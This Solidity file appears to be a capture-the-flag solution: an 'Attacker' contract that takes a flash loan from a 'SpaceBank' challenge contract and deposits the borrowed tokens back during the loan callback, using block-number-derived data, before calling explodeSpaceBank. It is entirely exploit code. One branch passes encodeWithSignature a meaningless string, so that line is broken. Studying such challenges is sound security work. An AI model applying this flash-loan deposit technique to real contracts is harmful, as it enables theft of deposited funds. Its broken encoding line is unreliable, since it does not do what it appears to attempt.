// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {console} from "forge-std/console.sol";
import "openzeppelin/access/Ownable.sol";
import "openzeppelin/token/ERC20/IERC20.sol";
import "openzeppelin/token/ERC20/ERC20.sol";
import "./SpaceBank.sol";

contract Attacker {
    address challenge;
    SpaceBank spaceBank;
    SpaceToken token;

    uint counter;

    constructor(address _challenge, address _spaceBank, address _token) {
        challenge = _challenge;
        spaceBank = SpaceBank(_spaceBank);
        token = SpaceToken(_token);
    }

    function executeFlashLoan(uint256 amount) external {
        if (counter == 0) {
            bytes memory data = abi.encode(block.number % 47);
            console.log(block.number);
            console.logBytes(data);
            token.approve(address(spaceBank), 1000000000000000000);
            spaceBank.deposit(amount, data);
            // spaceBank.deposit(500, "");
            counter++;
        } else {
            bytes memory data = abi.encodeWithSignature("address(this).call{value:0.001 ether}("")");
            token.approve(address(spaceBank), 1000000000000000000);
            spaceBank.deposit(500, data);
        }
    }

    function attack_1() external {
        SpaceBank(spaceBank).flashLoan(500, address(this));
    }

    function explode() external {
        SpaceBank(spaceBank).explodeSpaceBank();
    }

}